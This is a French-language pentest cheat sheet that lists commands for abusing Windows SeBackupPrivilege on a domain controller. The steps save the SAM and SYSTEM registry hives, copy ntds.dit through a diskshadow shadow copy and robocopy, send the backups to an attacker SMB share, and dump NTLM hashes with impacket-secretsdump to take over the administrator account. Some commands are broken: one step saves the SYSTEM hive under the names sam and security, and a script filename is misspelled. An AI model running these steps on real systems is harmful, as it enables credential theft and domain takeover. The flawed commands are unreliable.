
Ref: https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/



Identifier le user et ses droits
```bash 
# Enumeration 
whoami
whoami /groups
whoami /priv

net user <USER>
```

Les 2 droits à identifier : 
  SeBackupPrivilige permet de lire les fichiers sans considèrer les ACL
  SeRestorePrivilege permet d'ecrire des fichiers.

## Methode 0 : Récuperation des comptes locaux
```
cd C:/
mkdir Temp
cd Temp
reg save hklm\system c:\Temp\system
reg save hklm\system c:\Temp\sam
reg save hklm\system c:\Temp\security
```
  

## Methode 1: afficher avec netexec sur le module backup_operator
``` bash 
nxc smb <IP-DC> -u <USER> -p <PASS> -M backup_operator
```

## Methode 2: impact-reg + SMB server 
```
impacket-smbserver share $(pwd) -smb2support
```

```
impacket-reg "<DOMAIN_NAME>"/"<USER>":"<PASS>"@"<IP-DC>" backup -o '\\<IP-share>\share'
```

## Methode 3 : diskshadow et robocopy
```
evil-winrm -i <IP-DC> -u <USER> -p <PASS>
```
Shadow Copy & ntds.dit Extraction
Créeation d'utilisation d'un script pour faire une copie afin d'extraire plus facilement le NTDS.dit
```
nano script_extract.dsh
set context persistent nowriters
add volume c: alias pwn
create
expose %pwn% z:
```

```
unix2dos script_extract.dsh
```

```
upload script_extract.dsh
```
Copying ntds.dit

```
diskshadow /s cript_extract.dsh
robocopy /b z:\windows\ntds . ntds.dit
```
Saving the SYSTEM Registry Hive
```
reg save hklm\system c:\Temp\system
```
Recupération sur la kali 
```
download ntds.dit
download system
```
Dumping NTLM Hashes with impacket-secretsdump
```
impacket-secretsdump -ntds ntds.dit -system system local
```
 Recupération du hash de l'administrator et connection 






